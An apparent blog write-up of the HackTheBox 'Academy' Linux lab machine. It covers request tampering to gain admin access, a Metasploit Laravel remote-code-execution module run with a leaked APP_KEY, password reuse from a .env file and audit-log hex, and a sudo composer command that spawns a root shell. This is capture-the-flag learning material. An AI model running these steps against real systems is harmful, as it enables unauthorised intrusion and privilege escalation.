---
layout: post
title: [Academy - Linux]
subtitle: HackTheBox
thumbnail-img: /assets/img/academy.jpg
tags: [red]
---

This is my solution to the HackTheBox Passage Linux box, my second HTB writeup and my first root own!

# Academy - Linux - 10.10.10.215

# Enumeration:

As usual, we start out with nmap on the ip.

```
nmap -sC -sV -Pn 10.10.10.215
```

Results:
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 22:46 EST
Nmap scan report for 10.10.10.215
Host is up (0.029s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.51 seconds
```

From here, we see that there is an http port open with a redirect to http://academy.htb. We then open our hosts file by doing `sudo vim /etc/hosts`. There, we add the host `10.10.10.215 academy.htb`

Next, we access http://academy.htb, and find a login page. We try registering an account and logging in to see what the website gives. There is quite a bit of useless information, and I was unable to find any services that could be exploited. We then move to the `/admin.php` page to see if we can login as admin.

To do so, we use burpsuite, finding the original post request that we used to login to `register.php`, sending it to the repeater, modifying the username, password, confirm, and most importantly the roleid to 1, and then logging in with our set credentials into the `/admin.php` page.

## Breaking In:

Here, we see the following information:


![admin login page](./assets/img/admin_page_academy.png)


Let's check out http://dev-staging-01.academy.htb. Again we add this host to `/etc/hosts`, and we open the site. It gives us some good information:

```
APP_NAME 	"Laravel"

APP_ENV 	"local"

APP_KEY 	"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="

APP_DEBUG 	"true"

APP_URL 	"http://localhost"

SERVER_ADMIN 	"admin@htb"

DB_CONNECTION 	"mysql"

DB_HOST 	"127.0.0.1"

DB_PORT 	"3306"

DB_DATABASE "homestead"

DB_USERNAME "homestead"

DB_PASSWORD "secret"
```



We look up "lavarel" exploits on metasploit, and we find one for remote code execution. Running this with a listener system, with academy.htb as the target host, and with the given APP_KEY, we get a shell.

Opening up Kali, we first connect to the VPN then run the following commands:

```
msfconsole
search laravel
set RHOSTS academy.htb
set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
set lhost tun0
set vhot dev-staging-01.academy.htb
run
```

Here, we get a webshell. We use `python3 -c "import pty; pty.spawn('/bin/bash')"` to spawn a reverse shell.

After poking around for a bit, we find the `/var/www/html/academy/.env`, with the `ls -al` command which has credentials:

```
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!
```

We also find in the `/home' directory a list of possible users:

```
21y4d
ch4p
cry0l1t3
egre55
g0blin
mrb3n
```

We `su cry0l1t3` with cry0l1t3:mySup3rP4s5w0rd!!. 

## Winning:

Enter the home directory and `cat user.txt`

# Root: 

We can now ssh into cry0l1t3.

In cry0l1t3's `/var` directory, we enter `/var/log/audit`. Here, we want to search for root logins with the command:

```
cat * | grep 'comm="su"'
```

Results:

```
type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
```

We need to crack this data. Turns out it is unencrypted hex. When converted, we get:

```
mrb3n_Ac@d3my!
```

Looks like creds to me :). We try mrb3n:mrb3n_Ac@d3my!, which works!

We now execute `sudo -l` with mrb3n's password and get the following:

```
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer

````

We then use https://gtfobins.github.io/gtfobins/composer/ to get:

```
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
```

Running these commands breaks out of the restricted environment, giving access to a root shell. 

Navigating to the root directory, we are able to `cat root.txt` and own root!
